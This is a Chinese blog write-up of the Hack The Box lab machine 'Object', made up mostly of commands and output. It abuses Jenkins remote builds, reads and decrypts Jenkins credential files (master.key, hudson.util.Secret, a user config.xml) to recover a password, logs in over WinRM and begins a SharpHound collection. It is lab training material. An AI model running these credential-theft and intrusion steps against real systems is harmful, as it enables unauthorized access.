<!doctype html>
<html
  lang="zh-cn" 
  data-theme-mode="auto"
  >
  <head><meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/><title>
  HTB-Object | Wuvoun
</title>
<meta
  name="description"
  content="少女祈祷中..."
/><script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://wuvoun.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
  
</script>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>
<link
    rel="preload"
    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous"
  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
<meta property="og:type" content="website" />
  <meta property="og:title" content="HTB-Object | Wuvoun" />
  <meta
    property="og:description"
    content="少女祈祷中..."
  />
  <meta property="og:url" content="https://wuvoun.github.io/post/htb-object/" />
  <meta
    property="og:site_name"
    content="Wuvoun"
  />
  <meta
    property="og:image"
    content="https://github.com/wuvoun/picx-images-hosting/raw/master/output.szb3amhzz.webp"
  />
  <meta property="article:author" content="Wuvoun" />
  <meta property="article:published_time" content="2025-09-16T03:52:21&#43;08:00" />
  <meta property="article:modified_time" content="2025-09-16T03:52:21&#43;08:00" /><meta property="article:tag" content="ADCS" /><meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="https://github.com/wuvoun/picx-images-hosting/raw/master/output.szb3amhzz.webp" />
<link rel="shortcut icon" href="/favicon1.ico"><link rel="stylesheet" href="/css/main.min.5a853f279b790b623408299f44544bf0b98ef360d87a9d68d6dcd3848c735f90.css" />
<link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
    rel="stylesheet"
    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
  <body><div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg></div><div class="loading-word">少女祈祷中...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>
<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
This article does not have a corresponding language version
</div>
<div id="heatmap-tooltip"></div><div id="container">
      <div id="wrap"><div id="header-nav">
  <nav id="main-nav"><span class="main-nav-link-wrap">
        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
        <a class="main-nav-link" href="/">Home</a>
      </span><span class="main-nav-link-wrap">
        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span><span class="main-nav-link-wrap">
        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
        <a class="main-nav-link" href="/about">About</a>
      </span><a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav"></nav></div>
<header id="header"><picture></picture>
    <img  fetchpriority="high" src="https://github.com/wuvoun/picx-images-hosting/raw/master/output.szb3amhzz.webp" alt="HTB-Object"><div id="header-outer">
    <div id="header-title"><a href="/" id="logo">
            <h1 data-aos="slide-up">HTB-Object</h1>
          </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
  </div>
</header><div id="content"
          
          class="sidebar-right"  ><aside id="sidebar"><div class="sidebar-wrapper wrap-sticky">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents"></nav>
  </div>
</div></div>
          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img
    data-src="/avatar/../images/avatar.webp"
    data-sizes="auto"
    alt="Wuvoun"
    class="lazyload"
  />
  <div class="sidebar-author-name">Wuvoun</div>
  <div class="sidebar-description">少女祈祷中...</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div><div class="sidebar-state-number">12</div>
  </div>
  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
    <div>Categories</div>
    <div class="sidebar-state-number">
      2
    </div>
  </a>
  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
    <div>Tags</div>
    <div class="sidebar-state-number">8</div>
  </a>
</div>
<div class="sidebar-social"></div>
<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Home</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Archives</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">About</div>
    </div></div>
</div><div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div></div>
  </div>

  <div class="sidebar-widget"></div></aside>
<section id="main"><article
  class="h-entry article"
  itemprop="blogPost"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta"><div class="article-date">
  <span
    class="article-date-link"
    data-aos="zoom-in"
  >
    <time datetime="2025-09-16 03:52:21 &#43;0800 CST" itemprop="datePublished"
      >2025-09-16</time
    >
    <time style="display: none;" id="post-update-time"
      >2025-09-16</time
    >
  </span>
</div>
<div class="article-category"><a
      class="article-category-link"
      href="/categories/htb"
      data-aos="zoom-in"
      >HTB</a
    ></div>
</div>
    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="htb-object">
<a class="header-anchor" href="#htb-object"></a>
HTB-Object
</h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p $ports $ip -sV
</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-15 22:20 CST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.132
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.36s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http    Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>8080/tcp open  http    Jetty 9.4.43.v20210629
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.64 seconds
</span></span></code></pre></div><p>nmap 扫描，发现只有两个web网站和winrm口</p>
<p>jenkins 创建API Token ,为后面远程url触发准备</p>
<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image.b99ep2u6f.webp" alt="image.png"></p>
<p>token 为 <code>114d3f7b7962d2f9d307cfe702304af500</code></p>
<p>创建项目，设置远程触发，选择windows批处理程序，设置token名</p>
<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-1.41yezxrpdr.webp" alt="image.png"></p>
<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-2.1sfegg6ywx.webp" alt="image.png"></p>
<p>打开这个链接，开始远程构建</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://10.10.11.132:8080/job/test/build?token<span style="color:#f92672">=</span>test
</span></span></code></pre></div><p>无法反弹shell,解本地凭证</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">43412</span>
</span></span><span style="display:flex;"><span>1-<span style="color:#f92672">]</span>,TC;l3rT��QM5�N����D���Nҡ�;� �-�Õ�/<span style="color:#e6db74">&#34;*�1�jʹ�u0:Q|����xZ�&amp;�+�/�,�0̨̩�	��
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">���/5�
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">�
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">doh.dns.sb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          �
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">http/1.1h2+3&amp;</span>$<span style="color:#e6db74"> P�86~��N��7ߨ�_r��/�R C��P��Xwhoami
</span></span></span></code></pre></div><p>在admin_17207690984073220035\config.xml  里保存了 <code>oliver</code> 这个用户的密钥，需要解密</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>liver<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\.</span>jenkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\t</span>est&gt;cmd /c type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>liver<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\.</span>jenkins<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\a</span>dmin_17207690984073220035<span style="color:#ae81ff">\c</span>onfig.xml 
</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.1&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;user&gt;
</span></span><span style="display:flex;"><span>  &lt;version&gt;10&lt;/version&gt;
</span></span><span style="display:flex;"><span>  &lt;id&gt;admin&lt;/id&gt;
</span></span><span style="display:flex;"><span>  &lt;fullName&gt;admin&lt;/fullName&gt;
</span></span><span style="display:flex;"><span>  &lt;properties&gt;
</span></span><span style="display:flex;"><span>    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;credentials@2.6.1&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;domainCredentialsMap class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.util.CopyOnWriteMap</span>$Hash<span style="color:#e6db74">&#34;</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;entry&gt;
</span></span><span style="display:flex;"><span>          &lt;com.cloudbees.plugins.credentials.domains.Domain&gt;
</span></span><span style="display:flex;"><span>            &lt;specifications/&gt;
</span></span><span style="display:flex;"><span>          &lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;
</span></span><span style="display:flex;"><span>          &lt;java.util.concurrent.CopyOnWriteArrayList&gt;
</span></span><span style="display:flex;"><span>            &lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
</span></span><span style="display:flex;"><span>              &lt;id&gt;320a60b9-1e5c-4399-8afe-44466c9cde9e&lt;/id&gt;
</span></span><span style="display:flex;"><span>              &lt;description&gt;&lt;/description&gt;
</span></span><span style="display:flex;"><span>              &lt;username&gt;oliver&lt;/username&gt;
</span></span><span style="display:flex;"><span>              &lt;password&gt;<span style="color:#f92672">{</span>AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA<span style="color:#f92672">=}</span>&lt;/password&gt;
</span></span><span style="display:flex;"><span>              &lt;usernameSecret&gt;false&lt;/usernameSecret&gt;
</span></span><span style="display:flex;"><span>            &lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
</span></span><span style="display:flex;"><span>          &lt;/java.util.concurrent.CopyOnWriteArrayList&gt;
</span></span><span style="display:flex;"><span>        &lt;/entry&gt;
</span></span><span style="display:flex;"><span>      &lt;/domainCredentialsMap&gt;
</span></span><span style="display:flex;"><span>    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
</span></span><span style="display:flex;"><span>    &lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email-ext@2.84&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;triggers/&gt;
</span></span><span style="display:flex;"><span>    &lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty&gt;
</span></span><span style="display:flex;"><span>    &lt;hudson.model.MyViewsProperty&gt;
</span></span><span style="display:flex;"><span>      &lt;views&gt;
</span></span><span style="display:flex;"><span>        &lt;hudson.model.AllView&gt;
</span></span><span style="display:flex;"><span>          &lt;owner class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.MyViewsProperty&#34;</span> reference<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../..&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>          &lt;name&gt;all&lt;/name&gt;
</span></span><span style="display:flex;"><span>          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
</span></span><span style="display:flex;"><span>          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
</span></span><span style="display:flex;"><span>          &lt;properties class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.View</span>$PropertyList<span style="color:#e6db74">&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>        &lt;/hudson.model.AllView&gt;
</span></span><span style="display:flex;"><span>      &lt;/views&gt;
</span></span><span style="display:flex;"><span>    &lt;/hudson.model.MyViewsProperty&gt;
</span></span><span style="display:flex;"><span>    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display-url-api@2.3.5&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;providerId&gt;default&lt;/providerId&gt;
</span></span><span style="display:flex;"><span>    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
</span></span><span style="display:flex;"><span>    &lt;hudson.model.PaneStatusProperties&gt;
</span></span><span style="display:flex;"><span>      &lt;collapsed/&gt;
</span></span><span style="display:flex;"><span>    &lt;/hudson.model.PaneStatusProperties&gt;
</span></span><span style="display:flex;"><span>    &lt;jenkins.security.seed.UserSeedProperty&gt;
</span></span><span style="display:flex;"><span>      &lt;seed&gt;ea75b5bd80e4763e&lt;/seed&gt;
</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.seed.UserSeedProperty&gt;
</span></span><span style="display:flex;"><span>    &lt;hudson.search.UserSearchProperty&gt;
</span></span><span style="display:flex;"><span>      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
</span></span><span style="display:flex;"><span>    &lt;/hudson.search.UserSearchProperty&gt;
</span></span><span style="display:flex;"><span>    &lt;hudson.model.TimeZoneProperty/&gt;
</span></span><span style="display:flex;"><span>    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
</span></span><span style="display:flex;"><span>      &lt;passwordHash&gt;#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW&lt;/passwordHash&gt;
</span></span><span style="display:flex;"><span>    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
</span></span><span style="display:flex;"><span>    &lt;hudson.tasks.Mailer_-UserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mailer@1.34&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;emailAddress&gt;admin@object.local&lt;/emailAddress&gt;
</span></span><span style="display:flex;"><span>    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
</span></span><span style="display:flex;"><span>    &lt;jenkins.security.ApiTokenProperty&gt;
</span></span><span style="display:flex;"><span>      &lt;tokenStore&gt;
</span></span><span style="display:flex;"><span>        &lt;tokenList/&gt;
</span></span><span style="display:flex;"><span>      &lt;/tokenStore&gt;
</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.ApiTokenProperty&gt;
</span></span><span style="display:flex;"><span>    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
</span></span><span style="display:flex;"><span>      &lt;roles&gt;
</span></span><span style="display:flex;"><span>        &lt;string&gt;authenticated&lt;/string&gt;
</span></span><span style="display:flex;"><span>      &lt;/roles&gt;
</span></span><span style="display:flex;"><span>      &lt;timestamp&gt;1634793332195&lt;/timestamp&gt;
</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
</span></span><span style="display:flex;"><span>  &lt;/properties&gt;
</span></span><span style="display:flex;"><span>&lt;/user&gt;
</span></span></code></pre></div><p>使用这个的方法，将解密凭据需要的文件转储出来</p>
<ul>
<li>\secrets\master.key</li>
<li>\secrets\hudson.util.Secret</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cmd /c type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>liver<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\.</span>jenkins<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\a</span>dmin_17207690984073220035<span style="color:#ae81ff">\c</span>onfig.xml 
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cmd /c type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>liver<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\.</span>jenkins<span style="color:#ae81ff">\s</span>ecrets<span style="color:#ae81ff">\m</span>aster.key
</span></span></code></pre></div><p>将hudson.util.Secret以Base64的格式打印出来</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>powershell -NoProfile -Command <span style="color:#e6db74">&#34;[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(&#39;C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret&#39;))&#34;</span>
</span></span></code></pre></div><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-3.1ovsiqdw76.webp" alt="image.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=&#34;</span> | base64 -d &gt; hudson.util.Secret
</span></span></code></pre></div><p>本地解密脚本</p>
<p><a href="https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py">https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py</a></p>
<p>解密出密码为 <code>c1cdfun_d2434</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml
</span></span><span style="display:flex;"><span>/home/wuvoun/workspace/Object/jenkins_offline_decrypt.py:124: SyntaxWarning: invalid escape sequence <span style="color:#e6db74">&#39;\{&#39;</span>
</span></span><span style="display:flex;"><span>  secrets <span style="color:#f92672">+=</span> re.findall<span style="color:#f92672">(</span>secret_title + <span style="color:#e6db74">&#39;&gt;\{?(.*?)\}?&lt;/&#39;</span> + secret_title, data<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>c1cdfun_d2434
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;c1cdfun_d2434&#39;</span>
</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>oliver
</span></span><span style="display:flex;"><span>ip<span style="color:#f92672">=</span>10.10.11.132
</span></span><span style="display:flex;"><span>nxc winrm <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u $user -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>WINRM       10.10.11.132    <span style="color:#ae81ff">5985</span>   JENKINS          <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:JENKINS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:object.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>WINRM       10.10.11.132    <span style="color:#ae81ff">5985</span>   JENKINS          <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> object.local<span style="color:#ae81ff">\o</span>liver:c1cdfun_d2434 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>抓取bloodhound</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>liver<span style="color:#ae81ff">\D</span>esktop&gt; .<span style="color:#ae81ff">\S</span>harpHound.exe -c all
</span></span><span style="display:flex;"><span>2025-09-15T01:33:51.3587471-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
</span></span><span style="display:flex;"><span>2025-09-15T01:33:51.5774918-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
